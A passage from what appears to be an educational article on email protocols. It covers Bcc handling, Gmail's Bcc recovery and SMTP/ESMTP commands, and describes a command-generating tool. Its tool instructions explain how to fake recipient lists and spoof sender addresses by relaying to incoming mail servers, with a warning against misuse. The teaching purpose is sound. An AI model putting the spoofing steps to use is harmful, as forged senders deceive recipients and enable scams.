        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
The non-<code>Bcc</code> recipients get the redacted message.
</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-bcc-both" data-name="message-envelope-bcc-both" width="666.966" height="250.5" viewBox="-1.25 -125.25 666.966 250.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-124" width="274" height="248" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-93.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-71.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-49.5">RCPT TO:&lt;carol@example.com&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="200.233" y="-8.5" width="264" height="127.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="17"><tspan>Message</tspan></tspan><tspan x="212.233" y="39">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="61">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="83">Bcc: Carol &lt;carol@example.com&gt;,</tspan><tspan x="212.233" y="105"><tspan>          </tspan>Dave &lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
The <code>Bcc</code> recipients get the original message.
</figcaption>
  </figure>

  <ul>
    <li><strong>Individual delivery</strong>: While all non-<code>Bcc</code> recipients receive the same message,
each <code>Bcc</code> recipient receives a separate version of the message,
in which only they are listed as a <code>Bcc</code> recipient.
Just like the first approach,
this prevents <code>Bcc</code> recipients from learning about any other <code>Bcc</code> recipient.</li>
  </ul>

  <figure>
    <svg id="figure-message-envelope-bcc-bob-copy" data-name="message-envelope-bcc-bob-copy" width="666.966" height="184.5" viewBox="-1.25 -92.25 666.966 184.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-91" width="274" height="182" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-60.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-38.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-16.5">RCPT TO:&lt;bob@example.com&gt;</tspan>
    </text>
    <rect x="200.233" y="2.5" width="264" height="83.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="28"><tspan>Message</tspan></tspan><tspan x="212.233" y="50">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="72">To: Bob &lt;bob@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
All non-<code>Bcc</code> recipients get the same redacted message.
</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-bcc-carol" data-name="message-envelope-bcc-carol" width="666.966" height="206.5" viewBox="-1.25 -103.25 666.966 206.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-102" width="274" height="204" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-71.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-49.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="200.233" y="-8.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="17"><tspan>Message</tspan></tspan><tspan x="212.233" y="39">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="61">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="83">Bcc: Carol &lt;carol@example.com&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
Carol in <code>Bcc</code> gets her own version of the message.
</figcaption>
  </figure>

  <figure>
    <svg id="figure-message-envelope-bcc-dave" data-name="message-envelope-bcc-dave" width="666.966" height="206.5" viewBox="-1.25 -103.25 666.966 206.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-102" width="274" height="204" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-71.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-49.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="200.233" y="-8.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="17"><tspan>Message</tspan></tspan><tspan x="212.233" y="39">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="61">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="83">Bcc: Dave &lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
And so does Dave.
</figcaption>
  </figure>

  <ul>
    <li><strong>Empty field</strong>: While the standard requires that <code>Bcc</code> recipients are never disclosed to non-<code>Bcc</code> recipients,
it allows the sender to indicate with an empty <code>Bcc</code> field that there were hidden <code>Bcc</code> recipients.
Such a hint can be provided in any of the other three approaches.
Therefore, this is more of a second dimension rather than a fourth option,
increasing the overall number of <code>Bcc</code> possibilities to 3 · 2 = 6.</li>
  </ul>

  <figure>
    <svg id="figure-message-envelope-bcc-empty" data-name="message-envelope-bcc-empty" width="666.966" height="250.5" viewBox="-1.25 -125.25 666.966 250.5" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <line x1="469.546" y1="0" x2="507.983" y2="0" marker-end="url(#arrow-green)" stroke-dasharray="31"></line>
    <line x1="155.546" y1="0" x2="194.921" y2="0"></line>
    <rect x="0" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="77.617" y="-5.1"><tspan>Mail client</tspan> of</tspan><tspan x="77.617" y="16.9">alice@example.org</tspan>
    </text>
    <rect x="195.233" y="-124" width="274" height="248" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="-93.5"><tspan>Envelope</tspan></tspan><tspan x="212.233" y="-71.5">MAIL FROM:&lt;alice@example.org&gt;</tspan><tspan x="212.233" y="-49.5">RCPT TO:&lt;bob@example.com&gt;</tspan><tspan x="212.233" y="-27.5">RCPT TO:&lt;carol@example.com&gt;</tspan><tspan x="212.233" y="-5.5">RCPT TO:&lt;dave@example.net&gt;</tspan>
    </text>
    <rect x="200.233" y="13.5" width="264" height="105.5" rx="0" ry="0"></rect>
    <text text-anchor="start">
        <tspan x="212.233" y="39"><tspan>Message</tspan></tspan><tspan x="212.233" y="61">From: Alice &lt;alice@example.org&gt;</tspan><tspan x="212.233" y="83">To: Bob &lt;bob@example.com&gt;</tspan><tspan x="212.233" y="105">Bcc:</tspan>
    </text>
    <rect x="509.233" y="-41.75" width="155.233" height="83.5" rx="8" ry="8"></rect>
    <text text-anchor="middle">
        <tspan x="586.85" y="-16.1"><tspan>Outgoing</tspan></tspan><tspan x="586.85" y="5.9"><tspan>mail server</tspan></tspan><tspan x="586.85" y="27.9">of example.org</tspan>
    </text>

</svg>

    <figcaption>
An empty <code>Bcc</code> field indicates that there were hidden recipients without disclosing them.
</figcaption>
  </figure>

  <p>The advantage of removing the <code>Bcc</code> field completely is that
the mail client has to submit the message only once to the outgoing mail server.
The disadvantage of this approach is that
<code>Bcc</code> recipients don’t learn why they have received a given message:
They might have been a hidden recipient
or one of the non-hidden addresses might have forwarded the message to their mailbox.
Hidden recipients shouldn’t send a response to non-hidden recipients
because this discloses the fact that they also received the message,
which is what the author of the initial message tried to keep secret.
In my opinion, mail clients should warn users
when they click on “reply to all” for emails that weren’t addressed to them,
but none of the mail clients I tested did.
Even if the <code>Bcc</code> field is removed by the sender,
mail clients could deduce from the added <a href="#trace-information">trace information</a>
whether the message was first received for a listed recipient before being forwarded to their mailbox
if the address of the mailbox is not among the recipients.
In other words, the drawback of the complete removal approach could be compensated by mail clients but none of them do.</p>

  <p>The only way to be sure that a <code>Bcc</code> recipient won’t reply to all recipients by accident is to
first send the message to the non-<code>Bcc</code> recipients and then forward the message to the hidden recipients.
If the hidden recipients don’t need to be hidden from each other,
you can list them in the <code>To</code> field of the forwarded email.
Otherwise, keep them in the <code>Bcc</code> field.</p>

  <p>The <code>Bcc</code> field is often used to send an email to undisclosed recipients:
The primary recipients of the message are put into <code>Bcc</code> in order to prevent them from seeing each other.
Some mail clients, such as the Gmail web interface,
indicate this as the sender by using an empty <a href="#group-construct">group construct</a>,
such as <code>undisclosed-recipients:;</code>, in the <code>To</code> field.
As we learned above, this behavior isn’t guaranteed by the standard.
Given how prevalent it is to use <code>Bcc</code> for undisclosed recipients,
I think a new iteration of <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a> should reflect
user expectation and formally deprecate the grouped delivery approach unless the user agreed to this behavior.</p>

  <p>While the individual delivery approach is nice in theory
because recipients are informed about why (and to which <a href="#alias-address">alias</a>) they received a message,
it isn’t ideal in practice because it shifts work from the server back to the client.
One of the reasons <a href="#why-outgoing-mail-servers">why we use outgoing mail servers</a>
is that mail clients have to submit a message addressed to many recipients only once.
Creating and uploading an individual version of the message for each <code>Bcc</code> recipient
on the client-side defeats this purpose.
While some of the approaches to solve the <a href="#double-submission-problem">double-submission problem</a>
can alleviate this issue especially when large attachments are involved,
a simple <a href="#common-smtp-extensions"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extension</a> for submission would do the trick.
Since outgoing mail servers have no standardized way to indicate to mail clients
that they remove the <code>Bcc</code> header field from the message against the intention or at least spirit of the standard,
mail clients might upload individual versions of the message for <code>Bcc</code> recipients in vain.
As a consequence, mail clients should opt for complete <code>Bcc</code> removal by default.
However, they could do much more to <a href="#bcc-recovery">recover</a> some of the lost information on the receiving end
and then display this information to their users.
If you know about a free mail client which does this,
please <a href="mailto:contact@ef1p.com">let me know</a>.</p>

  <p>Sometimes, the <code>Bcc</code> field is simply used to prevent certain recipients from getting replies
rather than to hide them from other recipients.
An example of this is when you move the person who introduced you to someone else to <code>Bcc</code>
while still thanking them for the introduction in the reply.
This use case could also be addressed with a <code>Do-Not-Reply-To</code> field,
which lists all addresses that should be skipped in a reply.
Such a header field would also solve the <a href="#no-reply">no-reply problem</a>.
However, it’s almost impossible to bring <a href="#innovation">innovation</a> to email
because first implementations and then users would have to adopt such a change.</p>

</details>

<details>
  <summary id="gmail-bcc-recovery">

How does Gmail recover the Bcc header field of sent messages?

</summary>

  <p>The <code>Bcc</code> field serves yet another purpose:
It reminds the author to whom they sent a message.
While mail clients <a href="#bcc-removal">should remove</a> the <code>Bcc</code> field
when submitting a message to an outgoing mail server,
they store the message with the <code>Bcc</code> field in the sent folder of the user’s mailbox.
As you might remember, <a href="#double-submission-problem">Gmail does things differently</a>, though.
Instead of letting the mail client submit a copy of the message to the sent folder,
the outgoing mail server stores all sent messages in the user’s mailbox automatically.
This leads to the following question:
If mail clients remove the <code>Bcc</code> field from a message before sending it,
does Gmail recover the <code>Bcc</code> field for the user’s copy in the sent folder?
The answer is yes.
I tested this by submitting messages manually with the <a href="#extended-simple-mail-transfer-protocol">tool below</a>.
Gmail adds any <code>RCPT</code> <code>TO</code> addresses from the envelope
which are not among the recipients of the message
to a new <code>Bcc</code> field at the very top of the message
(even above the <code>Received</code> and <code>Return-Path</code> header fields,
which emails synchronized via <abbr title="Internet Message Access Protocol">IMAP</abbr> don’t have).
A consequence is that the <a href="#display-name">display names</a> of <code>Bcc</code> recipients cannot be recovered.
This procedure works reasonably well as long as the mail client submits the message only once
with all recipients in the envelope.
If the mail client opts to deliver a <a href="#bcc-removal">separate version</a> of the message to <code>Bcc</code> recipients,
Gmail fails to merge the <code>Bcc</code> recipients from the second submission into the message from the first submission.
It just ignores the second message with additional <code>Bcc</code> recipients
and the same <a href="#message-identification"><code>Message-ID</code></a> for archiving
even if it is submitted in the same session
by continuing with another <code>MAIL</code> <code>FROM</code> command after submitting the <code>DATA</code>.
If you think you can use this to bypass Gmail’s sent archive,
I must disappoint you:
If you submit another message with the same <code>Message-ID</code> but a different body,
Gmail stores the second message in the sent folder as well.
Moreover, Gmail always removes the <code>Bcc</code> field for recipients,
no matter whether you send the email via <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> or the website.</p>

</details>

<h4 id="simple-mail-transfer-protocol">Simple Mail Transfer Protocol (<abbr title="Simple Mail Transfer Protocol">SMTP</abbr>)</h4>

<p>The <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol">Simple Mail Transfer Protocol (<abbr title="Simple Mail Transfer Protocol">SMTP</abbr>)</a>
was first specified in <a href="https://datatracker.ietf.org/doc/html/rfc821"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 821</a> in 1982.
As its name suggests, it is a fairly simple protocol:</p>

<figure>
  <svg id="figure-simple-mail-transfer-protocol" data-name="simple-mail-transfer-protocol" width="393.682" height="685.25" viewBox="-36.841 -1.25 393.682 685.25" preserveAspectRatio="xMidYMid" xmlns="http://www.w3.org/2000/svg">

    <g>
        <rect x="-35.591" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="0" y="25.65"><tspan>Client</tspan></tspan>
        </text>
        <line x1="0" y1="40.75" x2="0" y2="682.75"></line>
    </g>
    <g>
        <rect x="284.409" y="0" width="71.182" height="39.5" rx="8" ry="8"></rect>
        <text text-anchor="middle">
            <tspan x="320" y="25.65"><tspan>Server</tspan></tspan>
        </text>
        <line x1="320" y1="40.75" x2="320" y2="682.75"></line>
    </g>
    <g>
        <line x1="0" y1="81.5" x2="318.75" y2="81.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="69.5">(Open connection)</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="123.5" x2="1.25" y2="123.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="111.5">220 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="165.5" x2="318.75" y2="165.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="153.5">HELO client.example.org</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="207.5" x2="1.25" y2="207.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="195.5">250 server.example.com</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="249.5" x2="318.75" y2="249.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="237.5">MAIL FROM:&lt;alice@example.org&gt;</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="291.5" x2="1.25" y2="291.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="279.5">250 Ok</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="333.5" x2="318.75" y2="333.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="321.5">RCPT TO:&lt;bob@example.com&gt;</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="375.5" x2="1.25" y2="375.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="363.5">250 Ok</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="417.5" x2="318.75" y2="417.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="405.5">DATA</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="459.5" x2="1.25" y2="459.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="447.5">354 Go ahead</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="501.5" x2="318.75" y2="501.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="489.5">(Actual message)</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="543.5" x2="1.25" y2="543.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="531.5">250 Ok</tspan>
        </text>
    </g>
    <g>
        <line x1="0" y1="585.5" x2="318.75" y2="585.5" marker-start="url(#circle-blue)" marker-end="url(#arrow-blue)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="159.375" y="573.5">QUIT</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="627.5" x2="1.25" y2="627.5" marker-start="url(#circle-green)" marker-end="url(#arrow-green)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="615.5">221 Bye</tspan>
        </text>
    </g>
    <g>
        <line x1="320" y1="669.5" x2="1.25" y2="669.5" marker-start="url(#circle-gray)" marker-end="url(#arrow-gray)" stroke-dasharray="312"></line>
        <text text-anchor="middle">
            <tspan x="160.625" y="657.5">(Close connection)</tspan>
        </text>
    </g>

</svg>

  <figcaption>

After opening a <a href="https://evalapply.org/internet/#transmission-control-protocol"><abbr title="Transmission Control Protocol">TCP</abbr> connection</a> on <a href="#port-numbers">port 25</a>,
the client sends commands and the server responds with
<a href="https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes">status codes</a>.
Once they greeted each other, the client transmits the <a href="#message-versus-envelope">envelope</a>,
followed by the <code>DATA</code> command and the message.

</figcaption>
</figure>

<details>
  <summary id="command-syntax">
Command syntax
</summary>

  <p>The first question that came to your mind after reading the above
<a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a>
probably was: Is <code>HELO</code> a typo?
No, it’s not.
<abbr title="Simple Mail Transfer Protocol">SMTP</abbr> commands simply consist of four characters.
They are almost always written in uppercase,
even though they are <a href="https://en.wikipedia.org/wiki/Case_sensitivity">case insensitive</a>.
But yes, <code>HELO</code> does stand for “hello”.
The purpose of this command is for the client to identify itself to the server with a domain name or an <abbr title="Internet Protocol">IP</abbr> address.
The identity provided by the client is relevant only in <a href="#helo-identity">rare circumstances</a>.</p>

  <p>Why are the <code>MAIL</code> <code>FROM</code> and <code>RCPT</code> <code>TO</code> commands longer than four characters, then?
They’re not.
The commands are just <code>MAIL</code> and <code>RCPT</code>.
<code>FROM</code> and <code>TO</code> denote the subsequent parameter value.
Some <a href="#common-smtp-extensions"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> extensions</a> define additional parameters for the <code>MAIL</code> command.
The name and value of these additional parameters are separated by an equals sign rather than a colon, though.</p>

</details>

<details>
  <summary id="field-terminology">
Field terminology
</summary>

  <p>Historically, the client could also specify
<a href="https://datatracker.ietf.org/doc/html/rfc822#section-6.2.7">how the message shall be routed</a>.
For this reason, the <code>MAIL</code> <code>FROM</code> address is also known as the <em>reverse path</em>
and the <code>RCPT</code> <code>TO</code> address is also known as the <em>forward path</em>.
<a href="https://en.wikipedia.org/wiki/Bounce_address#Terminology">Alternative names</a>
for the <code>MAIL</code> <code>FROM</code> address are <em>bounce address</em>,
<em>return path</em>, <em>envelope from</em>, and <em>5321 from</em>
(according to the most recent <a href="https://datatracker.ietf.org/doc/html/rfc5321"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr></a> for <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>).
I will stick to <code>MAIL</code> <code>FROM</code> and <code>RCPT</code> <code>TO</code> for the envelope fields
and to <code>From</code>, <code>To</code>, <code>Cc</code>, and <code>Bcc</code> for the message fields.
As we will see <a href="#trace-information">later on</a>,
the <code>MAIL</code> <code>FROM</code> address is added to the message in a <code>Return-Path</code> field.
<code>Return-Path</code> is thus a message field rather than an <a href="#message-versus-envelope">envelope field</a>.</p>

</details>

<h4 id="extended-simple-mail-transfer-protocol">Extended Simple Mail Transfer Protocol (<abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr>)</h4>

<p>A framework for extending <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> was introduced in <a href="https://datatracker.ietf.org/doc/html/rfc1425"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1425</a> in 1993.
The extensible protocol, which is backward compatible with <abbr title="Simple Mail Transfer Protocol">SMTP</abbr>,
is called the <a href="https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol#Extended_Simple_Mail_Transfer_Protocol">Extended Simple Mail Transfer Protocol (<abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr>)</a>.
<abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> was revised in <a href="https://datatracker.ietf.org/doc/html/rfc1651"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1651</a> (1994),
<a href="https://datatracker.ietf.org/doc/html/rfc1869"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1869</a> (1995),
<a href="https://datatracker.ietf.org/doc/html/rfc2821"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2821</a> (2001),
and most recently in <a href="https://datatracker.ietf.org/doc/html/rfc5321"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5321</a> (2008).
The basic idea behind <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> is that the client greets the server
with the <a href="https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.1">“extended hello” command</a> <code>EHLO</code>
instead of the old “hello” command <code>HELO</code>.
This indicates to the server that the client understands <abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr>.
The server responds with all the <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extensions it supports.
For the rest of the session,
the client can then make use of the server’s <a href="#common-smtp-extensions">advertised capabilities</a>.</p>

<h5 id="esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</h5>

<p>Let’s put theory into practice.
The following tool generates the command sequence to <a href="#submission-versus-relay">submit or relay</a> an email
with parameters of your choice.
One way of using the tool is simply to observe how parameter changes affect the protocol flow.
The reason for building this tool, however,
is that you can copy the commands to your <a href="#command-line-interface">command-line interface</a>
and send messages without the assistance of a mail client.
Since you shouldn’t enter your email password on a random website like this one,
I recommend that you use the mode for submission only with demo accounts which you’ve created for this purpose.
The password is stored in the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">local storage</a>
of your browser without any protections until you <a href="https://evalapply.org/#history-of-values">erase the history</a>.
Having said that, the tool is <a href="https://github.com/KasparEtter/ef1p/blob/main/code/tools/protocol/esmtp.tsx">open source</a>
like the rest of this website, and if you don’t trust me that this website is served from those files,
you can also <a href="https://github.com/KasparEtter/ef1p/blob/main/README.md">build and run</a> this website locally.
The tool uses <a href="https://autoconfig.thunderbird.net/v1.1/">Thunderbird’s database</a>
and <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
to resolve the server you want to connect to and the <a href="https://ipinfo.io/developers"><abbr title="Application Programming Interface">API</abbr> by ipinfo.io</a>
to determine your <abbr title="Internet Protocol">IP</abbr> address when you click on <code>Determine</code> next to the <code>Client</code> field.
The text in gray mimics what the responses from the server likely look like.
What you actually receive from the server will be different.
As long as the returned <a href="https://en.wikipedia.org/wiki/List_of_SMTP_server_return_codes">status code</a>
starts with a 2 or a 3, you should be fine.
If the returned status code starts with a 4 or a 5, something went wrong.
I list some ideas for things you can try out after the tool.
The boxes after that provide you with more information on various aspects,
which are useful for troubleshooting problems you might run into.
If you need more help, <a href="mailto:contact@ef1p.com">send me an email</a>
(probably with your mail client rather than with this tool). 🙂</p>



<h5 id="tool-instructions">Tool instructions</h5>

<ol>
  <li>Create a new account at a mailbox provider of your choice.
If you opt for Gmail, you should read <a href="#gmail-authentication-failure">this box</a> first.</li>
  <li>Enter the address of your account in the <code>From</code> field and your password in the <code>Password</code> field.
Set the <code>Mode</code> to <code>Submission</code>.</li>
  <li>After composing the message (<code>To</code>, <code>Subject</code>, and <code>Body</code>),
try to submit it to the outgoing mail server with the listed commands.</li>
  <li>The first line opens a <abbr title="Transport Layer Security">TLS</abbr> channel to the specified <code>Server</code>.
All other commands are sent to the server inside this channel.</li>
  <li>You can copy each line in bold to your <a href="https://en.wikipedia.org/wiki/Clipboard_(computing)">clipboard</a>
by clicking on it, which includes the newline character to <a href="#clipboard-verification">submit the command</a>.</li>
  <li>If the mail was submitted successfully, you can add more <code>To</code> or <code>Cc</code> recipients.
By copying only some of the generated <code>RCPT</code> <code>TO</code> commands but the full message,
you suppress the delivery of the message to the skipped recipients.
For those that receive the message,
it looks as if the message was delivered to all the recipients in the message.
I already mentioned this problem <a href="#recipients">above</a>.</li>
  <li>Besides faking recipients, you can also try to fake the sender.
Switch the mode from <code>Submission</code> to <code>Relay</code>
and change the <code>From</code> field to an address that you don’t own.
Now try to send the message directly to the incoming mail server of one of the recipients.
If the incoming mail server and the domain
which you try to send the email from are <a href="#domain-authentication">properly configured</a>,
your message should make it at best into the spam folder of the recipient.
Chances are that your message will be rejected during the <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> session or silently dropped thereafter.
The incoming mail server might also <a href="#graylisting">graylist</a> or <a href="#blacklists">blacklist</a> your <abbr title="Internet Protocol">IP</abbr> address.
Since you usually don’t relay email from your computer, this is nothing to worry about.
Forging the sender address is known as <a href="#spoofing">spoofing</a>.
Be careful which domains you try to impersonate.
If the domain owner configured a <a href="#domain-based-message-authentication-reporting-and-conformance"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record</a>,
they might be informed about your spoofing attempt and even receive the <a href="#failure-reports">content of your message</a>.</li>
</ol>

<p><strong>Important</strong>: Be a nice person and don’t scam others!
If you spoof the sender of an email in bad faith, you likely commit a crime in most countries.
I showed you this attack for educational purposes only because I believe that seeing is believing.
We can improve the state of email security only if consumers start demanding better security.
